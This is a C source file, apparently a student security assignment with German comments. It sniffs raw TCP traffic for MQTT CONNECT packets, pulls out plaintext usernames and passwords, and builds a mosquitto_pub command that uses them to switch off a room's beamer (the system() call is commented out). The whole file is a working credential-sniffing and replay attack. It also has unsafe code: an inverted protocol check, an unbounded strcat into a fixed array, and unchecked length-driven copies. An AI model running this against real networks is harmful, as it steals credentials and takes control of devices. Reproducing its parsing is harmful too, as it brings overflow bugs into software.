#include<stdio.h> //For standard things
#include<stdlib.h>    //malloc
#include<string.h>    //für strings
#include<sys/socket.h>
#include<netinet/in.h>
#include <zconf.h> // for open
#include "PA2.h"
 
int forward_packet(char* , int); 
int filter_remaining_length(char* , int);
int filter_connect_packet(char* , int);
int filter_protocol_name(char* , int,int,int);
int filter_connect_flags(char* , int,int,int);
int filter_client_identifier(char* , int,int,int);
int filter_user_name(char* , int,int,int);
int filter_password(char* , int,int,int);
int get_field(char*, char*, int);
 
int sock_raw; // erstelle unseren socket den Wir brauchen
char buffer[65536];

int password_found = 0; // boolean ob wir ein passendes Passwort gefunden haben

char user_name[1024]; //Saved Username
char password[1024];
char identifier[1024];
char protocol_name[1024];
char cmd[] = "mosquitto_pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";

struct sockaddr_in source,dest; //erstelle Sockadress
 
int main(int argc, char **argv){
    printf("Beginn Main...\n");
    unsigned int saddr_size;
    int data_size;
    struct sockaddr saddr;
 
    printf("Starting...\n");
    //Create a raw socket that shall sniff
    sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_TCP);
    if(sock_raw < 0)
    {
        printf("Socket Error\n");
        return 1;
    }
    while(password_found==0)
    {
        saddr_size = sizeof saddr;
        //Receive a packet
        data_size = 0;
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
     
         if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return -1;
        }
        //Now process the packet
        forward_packet(buffer , data_size);
        if(password_found){
             
             strcat(cmd,user_name);
             strcat(cmd," -P ");
             strcat(cmd,password);
             //system(cmd);
             close(sock_raw);
             return 0;
        }
     
    }
    close(sock_raw);
     
    printf("Finished\n");
    return 0;
}
 
/**
* Erhählt das gesammte Packet und filtert zunächst das TCP Packet raus
*/
int forward_packet(char* buffer, int size)
{
    //Get the IP Header part of this packet
    struct iphdr *iph = (struct iphdr*)buffer;
    switch (iph->protocol) //Check the Protocol and do accordingly...
    {
        case 6: //Case 6 ist TCP
            //Okay wir haben nun ein TCP Packet gefunden
            filter_connect_packet(buffer , size);
            break;
        default: 
            break;
    }
 
  return 0;
}

/**
* Erzählt einen Buffer der ein TCP Packet ist
*/
int filter_connect_packet(char* Buffer, int Size)
{
    struct iphdr* iph; // erstellen des IP Header
    struct tcphdr* tcph; //erstellen des TCP Header
 
    //Wir holen uns das Gesammte Payload Packer (inlc. Fixed Header, Variable Header, etc.)
    char* data_payload = get_tcp_payload(Buffer,&iph ,&tcph ); //Aufruf der Helper Funktion
 
    char mqtt_packet_type = data_payload[0] & 0xF0; //MQTT Packet Typ ist von Bit 7-4 definiert --> Filtern dieser Bits
    int is_connect_packet = mqtt_packet_type==16; // Wenn Bit 4 eine 1 ist ist es ein CONNECT Packet --> 0001000 = 16
 
    if(is_connect_packet){
       //printf("Found a Connect Packet !\n");
       //Super wir haben ein CONNECT Packet gefunden und verarbeiten dies nun weiter
       return filter_remaining_length(data_payload,Size);
    }
    else{
       return 0;
    }
}
 
/**
* Überstpringe die Remaining Length
*/
int filter_remaining_length(char* data_payload, int Size)
{
    int pos = 1;
    int multiplier = 1;
    int remaining_length = 0;
 
    remaining_length = data_payload[pos];
    
 
    pos++; //Das erste Byte beginnt erst nach dem Control Packet Type
    
    //Leicht abgewandter Code von
    // 2.2.3 Remaining Length
    //http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html
    char encodedByte = data_payload[pos];
    while((encodedByte & 128) != 0){
      remaining_length += (encodedByte & 127) * multiplier;
      multiplier *= 128;
      if (multiplier > 128*128*128){
          printf("Error: Remaining Length is not valid!");
          return -1;
      }
     
      pos++; //Falls die Remaining Length über mehrere Byte lang ist, überspringen wir diese
      encodedByte = data_payload[pos];
    }
    //Ende des abgewandten Codes
 
    //Okay wir stehen nun auf dem Protocol Name
    filter_protocol_name(data_payload, Size, remaining_length, pos);
  
     return 0;
}

/**
* Ließt ein Field aus und gibt dabei den pos Zeiger aus, für das nächste Feld,
* In field wird der Inhalt des Fields koopiert, und endet mit \0
* field muss dabei später gefreed werden
*/
int get_field(char* data_payload, char* field, int pos){ 
 pos++; // skip MSB
 int length_field = data_payload[pos];
 pos++;
 
 int i;
 //laufe das arraydurch
 for(i=0;i<length_field;i++){
  field[i] = data_payload[pos];
  pos++;
 }
 //setze ende des Strings
 field[length_field] = '\0';
 
 //Gebe neue position zurück
 return pos;
}
 

/**
* Finde den Protokollnamen heraus und fahre dann fort wenn dieser passt
*/
int filter_protocol_name(char* data_payload, int Size, int remaining_length, int pos ){
 //Lese Protocolname field aus
 pos = get_field(data_payload,protocol_name,pos);  
 
 //Setze erlaubte Namen
 int is_mqtt = strcmp(protocol_name,"MQTT");
 int is_mqisdp = strcmp(protocol_name,"MQIsdp");
 
 //Prüfe ob erlaubter name vorkam
 if(is_mqtt || is_mqisdp){
  pos++; // skip Protocol Level
  //Cool wir haben das richtige Protokoll gefunden auf zu den flags
  filter_connect_flags(data_payload, Size, remaining_length, pos);
 }
 
 
 return 0;
}

/**
* Filtere die Flags heraus und schau ob wir Username und Passwort mitgesendet bekommen haben
*/
int filter_connect_flags(char* data_payload, int Size, int remaining_length, int pos ){
 //pos stands now on connect flags
 
 //Setzte ob wir unsere Flags gefunden habenm je nachdem wo die Bits stehen
 int is_user_name_flag = (data_payload[pos] & 0x80)==128;
 int is_password_flag = (data_payload[pos] & 0x40)==64;
 
 pos++; // forward to keep alive
 
 pos++; //skip keep alive MSB
 pos++; //skip keep alive LSB
 
 //pos stands now on MSB of next Flag whatever this is
 
 //Skippe den client identifier
 pos = filter_client_identifier(data_payload, Size, remaining_length, pos);
 
 //nur wenn wir beides erhalten haben fahre fort( username und password)
 if(is_user_name_flag && is_password_flag){
  //Andere Flags müssen wir nicht berücksichtigen (siehe aufgabe)
  
  //Okay schauen wir nach welcher Username vorhanden ist
  pos = filter_user_name(data_payload, Size, remaining_length, pos);
  //Nach dem Username kommt das Password
  pos = filter_password(data_payload, Size, remaining_length, pos);
  
  printf("\n\n");
 
  password_found = 1; //springe aus der Main Schleife
 }
 
 
 
 return 0;
}


/**
* Unnötiger Client Identifier, steht uns nunmal im weg
*/
int filter_client_identifier(char* data_payload, int Size, int remaining_length, int pos ){
 pos = get_field(data_payload,identifier,pos); 
 return pos;
}

/**
* So hier gehts an die Wurst, wir müssen nun den Username auslesen
*/
int filter_user_name(char* data_payload, int Size, int remaining_length, int pos ){
  pos = get_field(data_payload,user_name,pos);
   return pos;
}

/**
* Safe das Passwort als Plaintext zu senden, wir freuen uns
*/
int filter_password(char* data_payload, int Size, int remaining_length, int pos ){
  pos = get_field(data_payload,password,pos);
 return pos;
}
